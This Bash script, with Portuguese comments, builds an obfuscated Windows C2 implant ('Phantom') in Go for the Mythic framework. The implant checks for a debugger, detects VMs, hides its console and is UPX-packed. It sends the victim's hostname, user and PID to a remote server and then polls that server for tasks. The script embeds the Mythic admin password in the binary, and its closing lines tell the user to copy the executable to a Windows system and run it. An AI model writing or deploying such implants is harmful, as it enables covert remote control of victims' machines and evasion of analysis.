#!/bin/bash

echo "[+] Instalando ferramentas para gerar payloads Windows ofuscados"

# Instalar dependências
apt update
apt install -y golang-go upx-ucl gcc-mingw-w64

# Criar diretório de trabalho
mkdir -p /opt/phantom_windows
cd /opt/phantom_windows

# Obter IP do servidor Mythic
SERVER_IP=$(curl -s ifconfig.me || hostname -I | awk '{print $1}')

echo "[+] Criando payload Phantom para Windows..."

# Criar payload Go otimizado para Windows
cat > phantom_windows.go << 'EOF'
package main

import (
    "bytes"
    "crypto/tls"
    "encoding/json"
    "fmt"
    "io/ioutil"
    "math/rand"
    "net/http"
    "os"
    "os/exec"
    "runtime"
    "strings"
    "syscall"
    "time"
    "unsafe"
)

var (
    mythicURL = "https://SERVER_IP_PLACEHOLDER:7443"
    username  = "mythic_admin"
    password  = "MYTHIC_PASSWORD_PLACEHOLDER"
    uuid      = generateUUID()
)

type LoginRequest struct {
    Username string `json:"username"`
    Password string `json:"password"`
}

type LoginResponse struct {
    Status      string `json:"status"`
    AccessToken string `json:"access_token"`
}

type CheckinRequest struct {
    UUID         string `json:"uuid"`
    User         string `json:"user"`
    Host         string `json:"host"`
    PID          int    `json:"pid"`
    IP           string `json:"ip"`
    ProcessName  string `json:"process_name"`
    OS           string `json:"os"`
    Architecture string `json:"architecture"`
    PayloadType  string `json:"payload_type"`
}

func antiDebug() bool {
    if runtime.GOOS == "windows" {
        kernel32 := syscall.NewLazyDLL("kernel32.dll")
        isDebuggerPresent := kernel32.NewProc("IsDebuggerPresent")
        ret, _, _ := isDebuggerPresent.Call()
        return ret != 0
    }
    return false
}

func vmDetection() bool {
    if runtime.GOOS == "windows" {
        cmd := exec.Command("wmic", "computersystem", "get", "manufacturer")
        if output, err := cmd.Output(); err == nil {
            outputStr := strings.ToLower(string(output))
            if strings.Contains(outputStr, "vmware") || 
               strings.Contains(outputStr, "virtualbox") ||
               strings.Contains(outputStr, "microsoft corporation") {
                return true
            }
        }
    }
    return false
}

func main() {
    rand.Seed(time.Now().UnixNano())
    
    if antiDebug() {
        os.Exit(0)
    }
    
    if vmDetection() {
        time.Sleep(time.Duration(30+rand.Intn(60)) * time.Second)
    }
    
    connectToMythic()
}

func connectToMythic() {
    client := &http.Client{
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
        Timeout: 30 * time.Second,
    }
    
    token := login(client)
    if token == "" {
        return
    }
    
    checkin(client, token)
    
    for {
        getTasks(client, token)
        time.Sleep(time.Duration(5+rand.Intn(10)) * time.Second)
    }
}

func login(client *http.Client) string {
    loginReq := LoginRequest{
        Username: username,
        Password: password,
    }
    
    jsonData, _ := json.Marshal(loginReq)
    resp, err := client.Post(mythicURL+"/auth", "application/json", bytes.NewBuffer(jsonData))
    if err != nil {
        return ""
    }
    defer resp.Body.Close()
    
    body, _ := ioutil.ReadAll(resp.Body)
    var loginResp LoginResponse
    json.Unmarshal(body, &loginResp)
    
    return loginResp.AccessToken
}

func checkin(client *http.Client, token string) bool {
    hostname, _ := os.Hostname()
    user := os.Getenv("USERNAME")
    
    checkinReq := CheckinRequest{
        UUID:         uuid,
        User:         user,
        Host:         hostname,
        PID:          os.Getpid(),
        IP:           getLocalIP(),
        ProcessName:  "phantom.exe",
        OS:           runtime.GOOS,
        Architecture: runtime.GOARCH,
        PayloadType:  "apollo",
    }
    
    jsonData, _ := json.Marshal(checkinReq)
    req, _ := http.NewRequest("POST", mythicURL+"/api/v1.4/agent_message", bytes.NewBuffer(jsonData))
    req.Header.Set("Authorization", "Bearer "+token)
    req.Header.Set("Content-Type", "application/json")
    
    resp, err := client.Do(req)
    if err != nil {
        return false
    }
    defer resp.Body.Close()
    
    return resp.StatusCode == 200
}

func getTasks(client *http.Client, token string) {
    req, _ := http.NewRequest("GET", mythicURL+"/api/v1.4/agent_message", nil)
    req.Header.Set("Authorization", "Bearer "+token)
    
    resp, err := client.Do(req)
    if err != nil {
        return
    }
    defer resp.Body.Close()
    
    body, _ := ioutil.ReadAll(resp.Body)
    if len(body) > 0 {
        // Process tasks here
    }
}

func getLocalIP() string {
    return "127.0.0.1"
}

func generateUUID() string {
    b := make([]byte, 16)
    for i := range b {
        b[i] = byte(rand.Intn(256))
    }
    return fmt.Sprintf("%x-%x-%x-%x-%x", b[0:4], b[4:6], b[6:8], b[8:10], b[10:])
}
EOF

# Substituir placeholders
sed -i "s/SERVER_IP_PLACEHOLDER/$SERVER_IP/g" phantom_windows.go

# Obter senha do Mythic
MYTHIC_PASSWORD=$(sudo /root/Mythic/mythic-cli config get admin_password 2>/dev/null || echo "mythic_password")
sed -i "s/MYTHIC_PASSWORD_PLACEHOLDER/$MYTHIC_PASSWORD/g" phantom_windows.go

echo "[+] Compilando payload para Windows..."

# Compilar para Windows x64
env GOOS=windows GOARCH=amd64 CGO_ENABLED=0 go build -ldflags="-s -w -H windowsgui" -o phantom_x64.exe phantom_windows.go

# Compilar para Windows x86
env GOOS=windows GOARCH=386 CGO_ENABLED=0 go build -ldflags="-s -w -H windowsgui" -o phantom_x86.exe phantom_windows.go

# Aplicar compressão UPX se disponível
if command -v upx &> /dev/null; then
    echo "[+] Aplicando compressão UPX..."
    upx --best --lzma phantom_x64.exe 2>/dev/null || true
    upx --best --lzma phantom_x86.exe 2>/dev/null || true
fi

echo "[+] Payloads gerados com sucesso!"
echo ""
echo "Arquivos criados:"
ls -la phantom_*.exe
echo ""
echo "Configuração:"
echo "  Mythic URL: https://$SERVER_IP:7443"
echo "  Senha Mythic: $MYTHIC_PASSWORD"
echo ""
echo "Recursos implementados:"
echo "  ✓ Anti-debugging (IsDebuggerPresent)"
echo "  ✓ VM Detection (WMIC)"
echo "  ✓ Conexão HTTPS com Mythic"
echo "  ✓ Compressão UPX"
echo "  ✓ Símbolos removidos (-s -w)"
echo "  ✓ Console oculto (-H windowsgui)"
echo ""
echo "Para usar:"
echo "  1. Copie phantom_x64.exe ou phantom_x86.exe para o sistema Windows"
echo "  2. Execute o arquivo"
echo "  3. O agente aparecerá automaticamente no Mythic"